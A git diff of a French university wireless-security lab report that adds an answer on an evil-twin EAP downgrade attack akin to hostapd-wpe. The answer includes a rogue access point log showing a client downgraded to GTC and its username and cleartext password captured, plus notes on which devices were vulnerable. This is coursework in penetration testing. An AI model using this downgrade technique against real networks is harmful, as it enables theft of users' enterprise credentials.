@@ -173,7 +173,35 @@ Pour implémenter l’attaque :
 
 > **_Question:_** Quelles sont vos conclusions et réflexions par rapport à la méthode hostapd-wpe ?
 > 
-> **_Réponse:_** 
+> **_Réponse:_** Essaie de downgrad, sinon récupère hash comme hostapd-wpe
+```
+Using interface wlan0 with hwaddr 00:11:22:33:44:00 and ssid "HEIG-Corp"
+wlan0: interface state COUNTRY_UPDATE->ENABLED
+wlan0: AP-ENABLED 
+
+
+Press enter to quit...
+
+wlan0: STA 72:b1:fa:c9:29:eb IEEE 802.11: authenticated
+wlan0: STA 72:b1:fa:c9:29:eb IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 72:b1:fa:c9:29:eb
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+
+
+GTC: Wed Jun  1 22:05:33 2022
+     username: stefan
+     password: djdhdhdhs
+wlan0: CTRL-EVENT-EAP-FAILURE 72:b1:fa:c9:29:eb
+wlan0: STA 72:b1:fa:c9:29:eb IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 72:b1:fa:c9:29:eb IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 72:b1:fa:c9:29:eb IEEE 802.11: authenticated
+wlan0: STA 72:b1:fa:c9:29:eb IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 72:b1:fa:c9:29:eb
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+```
+L'attaque a fonctionné avec un appareil Android (Samsung Galaxy S21 avec la dernière mise à jour). En revanche, depuis un desktop Windows, l'attaque n'a pas fonctionné.
 
 
 ### 4. En option, vous pouvez explorer d'autres outils comme [eapeak](https://github.com/rsmusllp/eapeak) ou [crEAP](https://github.com/W9HAX/crEAP/blob/master/crEAP.py) pour les garder dans votre arsenal de pentester.
